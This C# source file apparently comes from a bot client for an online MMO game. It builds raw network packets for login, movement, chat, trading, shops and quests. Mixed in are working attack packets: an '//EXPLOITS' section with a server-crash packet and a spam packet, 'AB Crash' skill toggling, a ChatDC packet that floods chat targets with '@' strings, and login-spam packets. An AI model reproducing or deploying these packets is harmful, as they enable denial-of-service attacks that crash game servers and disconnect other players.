using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Net.Sockets;
using System.Net;
using System.IO;
using System.Runtime.CompilerServices;
using System.Threading;
using System.Drawing;
using System.Windows.Forms;
using PixelCLB.Net;
using PixelCLB.Net.Events;
using PixelCLB;
using PixelCLB.PacketCreation;
using PixelCLB.CLBTools;
using PixelCLB.Tools;
using PixelCLB.Net.Packets;

namespace PixelCLB.PacketCreation
{
    internal class PacketHandler
    {

        public static PacketBuilder EXPLOIT_OPEN(Client c, int ID)
        {
            PacketBuilder packet = new PacketBuilder((short)S_OpCodes.EXPLOIT_OPEN);
            packet.WriteHex("01 00 00 00 08 FE 8A 00");
            packet.WriteInt(ID);
            return packet;
        }
        public static PacketBuilder EXPLOIT_CLOSE(Client c)
        {
            PacketBuilder packet = new PacketBuilder((short)S_OpCodes.EXPLOIT_CLOSE);
            packet.Write(0);
            packet.Write(255);
            return packet;
        }



        public static PacketBuilder LoginResponse(Client c, string auth, World world, int channelid, string password)
        {
            int channel = channelid - 1;
            PacketBuilder packet = new PacketBuilder((short)S_OpCodes.SELECT_CHANNEL);
            packet.Write(1);
            packet.WriteMapleString(auth);
            packet.WriteInt(0);
            packet.WriteShort(0);
            packet.WriteInt(c.RAND1);
            packet.WriteInt(0);
            packet.WriteInt(c.RAND2);
            packet.WriteShort(0);
            packet.Write(1);
            packet.Write((byte)world);
            packet.Write((byte)channel);
            packet.WriteInt(c.RAND2);
            return packet;
        }


        public static PacketBuilder ClientLogin(Client c, string auth, string password)
        {
            PacketBuilder packet = new PacketBuilder((short)S_OpCodes.LOGIN_PASSWORD);
            packet.Write(1);
            packet.WriteMapleString(password);
            packet.WriteMapleString(auth);
            packet.WriteInt(0);
            packet.WriteShort(0);
            packet.WriteInt(c.RAND1);
            packet.WriteInt(0);
            packet.WriteInt(c.RAND2);
            packet.WriteInt(0);
            packet.WriteShort(0);
            packet.Write(2);
            packet.WriteInt(0);
            packet.WriteShort(0);
            return packet;
        }

        public static PacketBuilder SelectWorldChannel_Client(Client c, World world, int channelid)
        {
            int channel = channelid - 1;
            PacketBuilder packet = new PacketBuilder((short)S_OpCodes.SELECT_CHANNEL);
            packet.Write(2);
            packet.Write((byte)world);
            packet.Write((byte)channel);
            packet.WriteHex("C0 A8 01 0F");
            return packet;
        }


        public static PacketBuilder ValidateLogin(byte Locale, ushort version, string subVer)
        {
            PacketBuilder packet = new PacketBuilder((short)S_OpCodes.VALIDATE_LOGIN);
            packet.Write(Locale);
            packet.WriteShort(Convert.ToInt16(version));
            packet.WriteShort(short.Parse(subVer));
            packet.Write(0);
            return packet;
        }
        public static PacketBuilder Pong()
        {
            PacketBuilder packet = new PacketBuilder((short)S_OpCodes.PONG);
            packet.WriteInt(Environment.TickCount);
            return packet;
        }
        /// <summary>
        /// [Header][INT(npcID)][Short(X)][Short(Y)]
        /// </summary>
        /// <param name="action"></param>
        /// <returns></returns>
        public static PacketBuilder NPC_Click(int npcID, short x, short y)
        {
            PacketBuilder packet = new PacketBuilder((short)S_OpCodes.NPC_Click);
            packet.WriteInt(npcID);
            packet.WriteShort(x);
            packet.WriteShort(y);
            return packet;
        }

        public static PacketBuilder npcChat(byte[] action)
        {
            PacketBuilder packet = new PacketBuilder((short)S_OpCodes.npcChat);
            packet.WriteBytes(action);
            packet.WriteInt(0);
            return packet;
        }

        public static PacketBuilder claimReward(byte[] action, byte actions, int rewardID)
        {
            PacketBuilder packet = new PacketBuilder((short)S_OpCodes.claimReward);
            packet.WriteInt(rewardID);
            packet.WriteBytes(action);
            packet.Write(actions);
            return packet;
        }



        public static PacketBuilder selectWorld(int worldid)
        {
            PacketBuilder packet = new PacketBuilder((short)S_OpCodes.SELECT_WORLD);
            packet.WriteShort2(worldid);
            return packet;
        }

        public static PacketBuilder EnterChannel(int uid, int hwid, int hwid2, long cauth, int worldID)
        {
            PacketBuilder packet = new PacketBuilder((short)S_OpCodes.ENTER_SERVER);
            packet.WriteInt((int)worldID);
            packet.WriteInt(uid);
            packet.WriteShort(0);
            packet.WriteInt(0);
            packet.WriteInt(hwid);
            packet.WriteInt(0);
            packet.WriteInt(hwid2);
            packet.WriteLong(cauth);
            return packet;
        }

        public static PacketBuilder CharSelect(string pic, int uid)
        {
            PacketBuilder packet = new PacketBuilder((short)S_OpCodes.SELECT_CHARACTER);
            packet.WriteMapleString(pic);
            packet.WriteInt(uid);
            packet.Write(0);
            packet.WriteMapleString(Constant.getRandomHexString(6, "-"[0]));
            packet.WriteMapleString("");
            return packet;
        }
        public static PacketBuilder checkIGNCharacter(string ignTarget)
        {
            PacketBuilder packet = new PacketBuilder((short)S_OpCodes.CHECK_IGN);
            packet.WriteMapleString(ignTarget);
            return packet;
        }
        public static PacketBuilder CreateCharacter(string ignTarget)
        {
            PacketBuilder packet = new PacketBuilder((short)S_OpCodes.CREATE_CHARACTER);
            packet.WriteMapleString(ignTarget);
            packet.WriteHex("FF FF FF FF 01 00 00 00 00 00 00 00 06 25 4E 00 00 BD 8F 00 00 00 00 00 00 AF 06 10 00 C2 5E 10 00 15 2C 14 00");
            return packet;
        }
        public static PacketBuilder Custom(string packets)
        {
            PacketBuilder packet = new PacketBuilder();
            packet.WriteHex(packets);
            return packet;
        }
        public static PacketBuilder changeFMRoom(string room, byte channel)
        {
            byte ch = (byte)(channel - 1);
            string roomNum = room;
            if (room.Length == 1)
            {
                roomNum = string.Concat("0", room);
            }
            roomNum = string.Concat("9100000", roomNum);
            PacketBuilder packet = new PacketBuilder((short)S_OpCodes.CHANGE_FM_ROOM);
            packet.Write(ch);
            packet.WriteInt(int.Parse(roomNum));
            packet.WriteInt(Environment.TickCount);
            return packet;
        }
        public static PacketBuilder changeChannel(int channel)
        {
            PacketBuilder packet = new PacketBuilder((short)S_OpCodes.CHANGE_CHANNEL);
            packet.Write((byte)channel);
            packet.WriteInt(Environment.TickCount);
            return packet;
        }


        public static PacketBuilder CharacterMove(Client c, int crc, Portal portal, bool ignoreChange = false)
        {
            try
            {
                PacketBuilder packet = new PacketBuilder((short)S_OpCodes.PLAYER_MOVE);
                packet.Write((byte)c.myCharacter.UsedPortals);
                if (crc != 0)
                {
                    int y = portal.Y - 10;
                    packet.WriteInt(crc); //MapCRC
                    packet.WriteInt(Environment.TickCount);
                    packet.WriteInt(0);
                    packet.Write(0);
                    packet.WriteShort(portal.X);
                    packet.WriteShort((short)y);
                    packet.WriteInt(0);
                    packet.Write(1);
                    Foothold foothold = c.myCharacter.Map.footholds.findBelow(new Point(portal.X, portal.Y));
                    int tries = 0;
                    while (foothold == null & tries <= 10)
                    {
                        foothold = c.myCharacter.Map.footholds.findBelow(new Point(portal.X, portal.Y));
                        tries++;
                    }
                    if (foothold != null)
                    {
                        int[] x = new int[] { portal.X, foothold.getY1(), 0, calcV((short)y, (short)foothold.getY1()), foothold.getId(), 4, 10000 };
                        addMovement(packet, MovementType.mtMove, x);
                        packet.Write(9);
                        packet.Write(4);
                        packet.WriteLong((long)0);
                        packet.WriteShort(portal.X);
                        packet.WriteShort((short)y);
                        c.myCharacter.Position = new Point(portal.X, portal.Y);
                        packet.WritePos(c.myCharacter.Position);
                        return packet;
                    }
                    else
                    {
                        c.updateLog("Error: Unable to find foothold for the given coords.");
                        return null;
                    }
                }
                else
                {
                    return null;
                }
            }
            catch (Exception e)
            {
                return null;
            }
        }

        public static PacketBuilder owlTeleport(byte channel, int MapID)
        {
            PacketBuilder packet = new PacketBuilder((short)S_OpCodes.OWL_Teleport);
            //packet.WriteInt(new Random().Next(1, 500));
            packet.WriteInt(Environment.TickCount);
            packet.Write(channel);
            packet.WriteInt(MapID);
            return packet;
        }

        /// <summary>
        /// Movement Tools
        /// </summary>
        /// <param name="old"></param>
        /// <param name="neww"></param>
        /// <returns></returns>
        private static short calcV(short old, short neww)
        {
            return (short)Math.Min(670, Math.Round(Math.Sqrt((double)Math.Abs((int)(old - neww)))) * 60);
        }

        private static void addMovement(PacketBuilder packet, MovementType type, int[] param)
        {
            packet.Write((byte)type);
            MovementType movementType = type;
            if (movementType == MovementType.mtMove)
            {
                packet.WriteShort((short)param[0]);
                packet.WriteShort((short)param[1]);
                packet.WriteShort((short)param[2]);
                packet.WriteShort((short)param[3]);
                packet.WriteShort((short)param[4]);
                packet.Write((byte)param[5]);
                packet.WriteShort((short)param[6]);
                return;
            }
            else
            {
                if (movementType == MovementType.mt9)
                {
                    packet.Write((byte)param[0]);
                    return;
                }
                else
                {
                    if (movementType == MovementType.mtb4JD)
                    {
                        packet.WriteShort((short)param[0]);
                        packet.WriteShort((short)param[1]);
                        packet.WriteShort((short)param[2]);
                        packet.WriteShort((short)param[3]);
                        packet.Write((byte)param[4]);
                        return;
                    }
                    else
                    {
                        return;
                    }
                }
            }
        }


        public static PacketBuilder ClickInven(byte Slot)
        {
            PacketBuilder packet = new PacketBuilder((short)S_OpCodes.CLICK_INVEN);
            packet.Write(0);
            packet.Write(Slot);
            packet.WriteShort(0);
            packet.Write(0);
            return packet;
        }

        public static PacketBuilder Enter_Store(int storeID)
        {
            PacketBuilder packet = new PacketBuilder((short)S_OpCodes.OPEN_STORE);
            packet.Write(0x13);
            packet.WriteInt(storeID);
            packet.WriteShort(0);
            return packet;
        }


        public static PacketBuilder Open_Store(string title, int storeID, byte slot)
        {
            PacketBuilder packet = new PacketBuilder((short)S_OpCodes.OPEN_STORE);
            packet.WriteHex("10 06");
            packet.WriteMapleString(title);
            packet.Write(0);
            packet.Write(slot);
            packet.Write(0);
            packet.WriteInt(storeID);
            return packet;
        }
        public static PacketBuilder Open_Permit(string title, int storeID, byte slot)
        {
            PacketBuilder packet = new PacketBuilder((short)S_OpCodes.OPEN_STORE);
            packet.WriteHex("10 05");
            packet.WriteMapleString(title);
            packet.Write(0);
            packet.Write(slot);
            packet.Write(0);
            packet.WriteInt(5140000);
            return packet;
        }
        public static PacketBuilder Close_Store()
        {
            PacketBuilder packet = new PacketBuilder((short)S_OpCodes.OPEN_STORE);
            packet.Write(0x1C);
            return packet;
        }

        public static PacketBuilder AddItem(long price)
        {
            PacketBuilder packet = new PacketBuilder((short)S_OpCodes.OPEN_STORE);
            packet.WriteHex("22 02 01 00 01 00 01 00");
            packet.WriteLong(price);
            return packet;
        }

        public static PacketBuilder Open_stage1()
        {
            PacketBuilder packet = new PacketBuilder((short)S_OpCodes.OPEN_STORE);
            packet.WriteHex("52 00 00");
            return packet;
        }
        public static PacketBuilder Open_stage2()
        {
            PacketBuilder packet = new PacketBuilder((short)S_OpCodes.OPEN_STORE);
            packet.WriteHex("1A 01");
            return packet;
        }
        public static PacketBuilder Open_stage3()
        {
            PacketBuilder packet = new PacketBuilder((short)S_OpCodes.OPEN_STORE);
            packet.WriteHex("1C");
            return packet;
        }
        public static PacketBuilder editStore(string pic, int id)
        {
            PacketBuilder packet = new PacketBuilder((short)S_OpCodes.OPEN_STORE);
            packet.WriteHex("1F 13 06");
            packet.WriteMapleString(pic);
            packet.WriteInt(id);
            packet.Write(0);
            return packet;
        }
        public static PacketBuilder editStore2(int id)
        {
            PacketBuilder packet = new PacketBuilder((short)S_OpCodes.OPEN_STORE);
            packet.WriteHex("13");
            packet.WriteInt(id);
            packet.WriteShort(0);
            return packet;
        }
        public static PacketBuilder changeStoreName(string name) // max 50
        {
            PacketBuilder packet = new PacketBuilder((short)S_OpCodes.OPEN_STORE);
            packet.WriteHex("3D");
            packet.WriteMapleString(name);
            return packet;
        }

        public static PacketBuilder banUserFromPermit(byte slot, string ign, bool banSelf) // max 50
        {
            PacketBuilder packet = new PacketBuilder((short)S_OpCodes.OPEN_STORE);
            packet.Write(0x50);
            if (banSelf)
            {
                packet.Write(0);
                packet.WriteInt(0);
                packet.WriteShort(0);
            }
            else
            {
                packet.Write(slot);
                packet.WriteMapleString(ign);
            }
            return packet;
        }

        public static PacketBuilder closeStore(bool stage)
        {
            PacketBuilder packet = new PacketBuilder((short)S_OpCodes.OPEN_STORE);
            if(stage)
            packet.Write(0x34);
            if(!stage)
            packet.Write(0x1C);
            return packet;
        }
        public static PacketBuilder Permit_AddItem(long price)
        {
            PacketBuilder packet = new PacketBuilder((short)S_OpCodes.OPEN_STORE);
            packet.WriteHex("41 02 01 00 01 00 01 00");
            packet.WriteLong(price);
            return packet;
        }
        public static PacketBuilder On_Permit_Final()
        {
            PacketBuilder packet = new PacketBuilder((short)S_OpCodes.OPEN_STORE);
            packet.WriteHex("52 00 00");
            return packet;
        }
        public static PacketBuilder On_Permit_Final2()
        {
            PacketBuilder packet = new PacketBuilder((short)S_OpCodes.OPEN_STORE);
            packet.WriteHex("1A 01");
            return packet;
        }
        public static PacketBuilder accept_Trade_Request(int tradeID)
        {
            PacketBuilder packet = new PacketBuilder((short)S_OpCodes.OPEN_STORE);
            packet.Write(0x13);
            packet.WriteInt(tradeID);
            packet.WriteShort(0);
            return packet;
        }
        public static PacketBuilder decline_Trade_Request(int tradeID)
        {
            PacketBuilder packet = new PacketBuilder((short)S_OpCodes.OPEN_STORE);
            packet.Write(0x16);
            packet.WriteInt(tradeID);
            packet.Write(0x03);
            return packet;
        }
        public static PacketBuilder EnterCS()
        {
            PacketBuilder packet = new PacketBuilder((short)S_OpCodes.ENTER_CS);
            packet.WriteInt(Environment.TickCount);
            packet.Write(0);
            return packet;
        }

        public static PacketBuilder ExitCS()
        {
            PacketBuilder packet = new PacketBuilder((short)S_OpCodes.ChangeMap_ExitCS);
            return packet;
        }

        public static PacketBuilder EnterFarm(int UID)
        {
            PacketBuilder packet = new PacketBuilder((short)S_OpCodes.Enter_Farm);
            packet.WriteInt(UID);
            packet.WriteInt(Environment.TickCount);
            return packet;
        }
        public static PacketBuilder ExitFarm()
        {
            PacketBuilder packet = new PacketBuilder((short)S_OpCodes.Exit_Farm);
            return packet;
        }

        public static PacketBuilder findPlayer(string ign)
        {
            PacketBuilder packet = new PacketBuilder((short)S_OpCodes.WHISPER);
            packet.Write(5);
            packet.WriteInt(Environment.TickCount);
            packet.WriteMapleString(ign);
            return packet;
        }

        public static PacketBuilder allChat(string text)
        {
            PacketBuilder packet = new PacketBuilder((short)S_OpCodes.ALL_CHAT);
            packet.WriteInt(Environment.TickCount);
            packet.WriteMapleString(text);
            packet.Write(0);
            return packet;
        }

        public static PacketBuilder whisper(string ign, string text)
        {
            PacketBuilder packet = new PacketBuilder((short)S_OpCodes.WHISPER);
            packet.Write(6);
            packet.WriteInt(Environment.TickCount);
            packet.WriteMapleString(ign);
            packet.WriteMapleString(text);
            packet.Write(0);
            return packet;
        }

        public static PacketBuilder buddyChat(Client c, string text)
        {
            PacketBuilder packet = new PacketBuilder((short)S_OpCodes.GUILD_BL_ALI_EXPED_CHAT);
            packet.WriteInt(Environment.TickCount);
            packet.Write(0); //Buddy chat identifier
            packet.Write((byte)c.buddyUIDS.Count());
            foreach (int uid in c.buddyUIDS)
            {
                packet.WriteInt(uid);
            }
            packet.WriteMapleString(text);
            packet.Write(0);
            return packet;
        }

        public static PacketBuilder guildChat(Client c, string text)
        {
            PacketBuilder packet = new PacketBuilder((short)S_OpCodes.GUILD_BL_ALI_EXPED_CHAT);
            packet.WriteInt(Environment.TickCount);
            packet.Write(2); //Guild Chat identifier
            byte memberCount = (byte)c.guildMemberUIDS.Count();
            packet.Write(memberCount);
            foreach (int uid in c.guildMemberUIDS)
            {
                packet.WriteInt(uid);
            }
            packet.WriteMapleString(text);
            packet.Write(0);
            return packet;
        }


        public static PacketBuilder storeChat(string text)
        {
            PacketBuilder packet = new PacketBuilder((short)S_OpCodes.OPEN_STORE);
            packet.Write(0x18);
            packet.WriteInt(Environment.TickCount);
            packet.WriteMapleString(text);
            return packet;
        }

        public static PacketBuilder addToGuild(string ign)
        {
            PacketBuilder packet = new PacketBuilder((short)S_OpCodes.ADD_GUILD);
            packet.Write(5);
            packet.WriteMapleString(ign);
            return packet;
        }

        public static PacketBuilder formExped(string EXPEDID)
        {
            PacketBuilder packet = new PacketBuilder((short)S_OpCodes.MAKE_EXPED);
            packet.WriteHex(EXPEDID);
            packet.Write(0);
            return packet;
        }

        /// <summary>
        /// EXPED = 6
        /// Alliance = 3
        /// </summary>
        /// <param name="UID"></param>
        /// <param name="function"></param>
        /// <param name="count"></param>
        /// <returns></returns>
        public static PacketBuilder ChatDC(string UID, byte function, byte count)
        {
            byte num = 0;
            PacketBuilder packet = new PacketBuilder((short)S_OpCodes.GUILD_BL_ALI_EXPED_CHAT);
            packet.WriteInt(Environment.TickCount);
            packet.Write(function);
            packet.Write(count);
            while (num < count)
            {
                packet.WriteHex(UID);
                num++;
            }
            packet.WriteMapleString("@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@");
            return packet;
        }

        public static PacketBuilder changeMap(Client c, string portalName)
        {
            PacketBuilder packet = new PacketBuilder((short)S_OpCodes.ChangeMap_ExitCS);
            packet.Write((byte)c.myCharacter.UsedPortals);
            packet.WriteHex("FF FF FF FF");
            packet.WriteInt(c.RAND3);
            Portal p = c.myCharacter.Map.getPortalByName(portalName);
            packet.WriteMapleString(p.name);
            packet.WriteShort(p.X);
            packet.WriteShort(p.Y);
            packet.WriteShort(0);
            packet.Write(0);
            return packet;
        }

        public static PacketBuilder closeNPCShop(Client c)
        {
            c.npcShop = null;
            PacketBuilder packet = new PacketBuilder((short)S_OpCodes.npcShopAction);
            packet.Write(3);
            return packet;
        }

        public static PacketBuilder buyItemFromNPC(short slot, int id, short quant, int price)
        {
            PacketBuilder packet = new PacketBuilder((short)S_OpCodes.npcShopAction);
            packet.Write(0);
            packet.WriteShort(slot);
            packet.WriteInt(id);
            packet.WriteShort(quant);
            packet.WriteInt(price);
            return packet;
        }


        public static PacketBuilder sellItemToNPC(short slot, int itemID, short quantity)
        {
            PacketBuilder packet = new PacketBuilder((short)S_OpCodes.npcShopAction);
            packet.Write(1);
            packet.WriteShort(slot);
            packet.WriteInt(itemID);
            packet.WriteShort(quantity);
            return packet;
        }


        public static PacketBuilder useBuff(int skillID, byte skillLevel, Client c)
        {
            PacketBuilder packet = new PacketBuilder((short)S_OpCodes.useBuff);
            packet.WriteInt(Environment.TickCount);
            packet.WriteInt(skillID);
            packet.Write(skillLevel);
            packet.WriteShort((short)c.myCharacter.Position.X);
            packet.WriteShort((short)c.myCharacter.Position.Y);
            packet.WriteShort(0x3F); //3F 00
            packet.WriteShort(0);
            return packet;
        }

        public static PacketBuilder useItem(short slot, int itemid)
        {
            PacketBuilder packet = new PacketBuilder((short)S_OpCodes.useItem);
            packet.WriteInt(Environment.TickCount);
            packet.WriteShort(slot);
            packet.WriteInt(itemid);
            return packet;
        }

        /// <summary>
        /// [Header][Short(Slot)][INT(itemID)][Short(amt)]
        /// </summary>
        /// <param name="slot"></param>
        /// <param name="itemid"></param>
        /// <param name="amount"></param>
        /// <returns></returns>
        public static PacketBuilder consumeScripted(short slot, int itemid, short amount)
        {
            PacketBuilder packet = new PacketBuilder((short)S_OpCodes.consumeScripted);
            packet.WriteInt(Environment.TickCount);
            packet.WriteShort(slot);
            packet.WriteInt(itemid);
            packet.WriteInt(amount);
            return packet;
        }

        public static PacketBuilder harvestObject(int id)
        {
            PacketBuilder packet = new PacketBuilder((short)S_OpCodes.HARVEST);
            packet.WriteInt(id);
            packet.WriteInt(0);
            packet.WriteInt(2); 
            packet.WriteInt(0);
            packet.WriteShort(0);
            return packet;
        }
        public static PacketBuilder lootItem(Client c, int lootID, Point p, int crc = 0)
        {
            PacketBuilder packet = new PacketBuilder((short)S_OpCodes.PICKUPITEM);
            packet.Write((byte)c.myCharacter.UsedPortals);
            packet.WriteInt(Environment.TickCount);
            packet.WritePos(p);
            packet.WriteInt(lootID);
            packet.WriteInt(crc);
            packet.Write(1);
            return packet;
        }

        public static PacketBuilder dropItem(byte inven, short slot, short amount)
        {
            //4 = ETC
            PacketBuilder packet = new PacketBuilder((short)S_OpCodes.dropItem);
            packet.WriteInt(Environment.TickCount);
            packet.Write(inven);
            packet.WriteShort(slot);
            packet.WriteShort(0);
            packet.WriteShort(amount);
            return packet;
        }

        public static PacketBuilder deleteItem(int itemID)
        {
            //4 = ETC
            PacketBuilder packet = new PacketBuilder((short)S_OpCodes.delete_Item);
            packet.Write(3);
            packet.WriteInt(itemID);
            return packet;
        }


        //Events
        public static PacketBuilder harvestEventBox(int boxID)
        {
            PacketBuilder packet = new PacketBuilder((short)S_OpCodes.AnniTownBox);
            packet.WriteInt(boxID);
            return packet;
        }


        //AB Crash
        public static PacketBuilder abXForm(bool xform)
        {

            PacketBuilder packet = new PacketBuilder((short)S_OpCodes.abxForm);
            if (xform)
                packet.Write(1);
            else
                packet.Write(0);
            return packet;
        }

        public static PacketBuilder abSkill(bool cancel, int skillID, byte level = 0)
        {
            if (!cancel)
            {
                PacketBuilder packet = new PacketBuilder((short)S_OpCodes.useSkill);
                packet.WriteInt(skillID);
                packet.Write(level);
                packet.WriteHex("E2 01 03");
                return packet;
            }
            else
            {
                PacketBuilder packet = new PacketBuilder((short)S_OpCodes.cancelSkill);
                packet.WriteInt(skillID);
                packet.Write(level);
                return packet;
            }
        }


        //EXPLOITS

        public static PacketBuilder crashServer(Client c)
        {
            PacketBuilder packet = new PacketBuilder((short)S_OpCodes.CRASH_HEADER);
            int random = new Random().Next(5010000, 5990000);
            c.updateLog("[ID]: " + random.ToString());
            packet.WriteHex("24 00 08 00");
            packet.WriteShort(0);
            packet.WriteInt(random);
            packet.WriteHex("E0 93 04 00 03 00 00 00");
            return packet;
        }

        public static PacketBuilder spamThis(Client c)
        {
            PacketBuilder packet = new PacketBuilder((short)S_OpCodes.CRASH_HEADER);
            packet.WriteHex("67 02 B7 C4 04 00 00 07 00");
            return packet;
        }



        public static PacketBuilder FarmPacket()
        {
            PacketBuilder packet = new PacketBuilder((short)S_OpCodes.Farm_Packet);
            packet.WriteInt(0);
            packet.Write(1);
            return packet;
        }
        public static PacketBuilder LoginSpamPacket()
        {
            PacketBuilder packet = new PacketBuilder((short)S_OpCodes.LoginSpam_Packet);
            packet.WriteShort(0);
            packet.WriteHex("91 0E 7D 00");
            packet.WriteHex("0A 00 00 00 04 04 02 68 FF 0C 00 AA 29 27 02 0A 00 00 00 64 00 00 00 0A 00");
            /*
            packet.WriteHex("93 6B E9 00");
            //packet.WriteInt(0);
            packet.WriteHex("FF FF FF 7F 01 FF FF FF 7F 16 00 FF FF FF 7F 0A FF FF FF 7F 75 FF FF FF 7F");
            */
            return packet;


        }

        /// <summary>
        /// [Header] [FUNCTION(BYTE)] [QUESTID(SHORT)] [NPCID(INT)] [X(SHORT)] [Y(SHORT)]
        /// </summary>
        /// <param name="function"></param>
        /// <param name="questID"></param>
        /// <param name="npcID"></param>
        /// <param name="x"></param>
        /// <param name="y"></param>
        /// <returns></returns>
        public static PacketBuilder accept_Quest(byte function, short questID, int npcID, short x, short y)
        {
            PacketBuilder packet = new PacketBuilder((short)S_OpCodes.Quest_Accept); 
            packet.Write(function);
            packet.WriteShort(questID);
            packet.WriteInt(npcID);
            packet.WriteShort(x);
            packet.WriteShort(y);
            return packet;
        }

        public static PacketBuilder MoonSpawn1()
        {
            PacketBuilder packet = new PacketBuilder((short)S_OpCodes.Quest_Accept); //ED 00 00 D5 23 01 00 00 00 34 0B 20 00
            packet.Write(0);
            packet.WriteInt(74709);
            packet.WriteShort(0);
            packet.WriteInt(2100020);
            return packet;
        }
        public static PacketBuilder MoonSpawn2()
        {
            PacketBuilder packet = new PacketBuilder((short)S_OpCodes.Consume_Summon); //9B 00 ** ** ** ** 01 00 34 0B 20 00
            packet.WriteInt(Environment.TickCount);
            packet.WriteShort(1);
            packet.WriteInt(2100020);
            return packet;
        }

        public static PacketBuilder Cassandra(byte function, int slot, int itemID)
        {
            PacketBuilder packet = new PacketBuilder((short)S_OpCodes.Cassandra); //78 01 [01] [0E 00 00 00] [5C F4 3C 00]
            packet.Write(function);
            if (function == 1)
            {
                packet.WriteInt(slot);
                packet.WriteInt(itemID);
            }
            return packet;
        }

        public static PacketBuilder spamLogin()
        {
            PacketBuilder packet = new PacketBuilder((short)S_OpCodes.Spam_Packet);
            packet.Write(1);
            packet.WriteMapleString("@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@");
            return packet;
        }

    }
}

//MessageBox.Show("" + packet);